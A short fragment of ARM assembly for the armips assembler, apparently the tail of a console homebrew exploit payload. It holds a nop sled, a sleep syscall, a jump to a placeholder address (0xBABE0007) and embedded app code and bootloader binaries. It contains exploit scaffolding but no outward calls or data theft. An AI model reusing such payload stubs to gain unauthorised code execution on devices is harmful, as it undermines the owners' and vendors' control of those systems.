			nop
			nop
			nop
			nop
			nop
			nop
			nop
			ldr r0, =200*1000*1000 ; 200ms
			ldr r1, =0x00000000
			.word 0xef00000a ; svcSleepThread
			ldr r2, =0xBABE0007
			blx r2
			
		.pool

		; don't actually care if we copy too much...
		; .fill ((appHook + 0x200) - .), 0xDA

	.align 0x20
	appCode:
		.incbin "app_code.bin"

	.align 0x20
	appBootloader:
		.incbin "app_bootloader.bin"


.Close
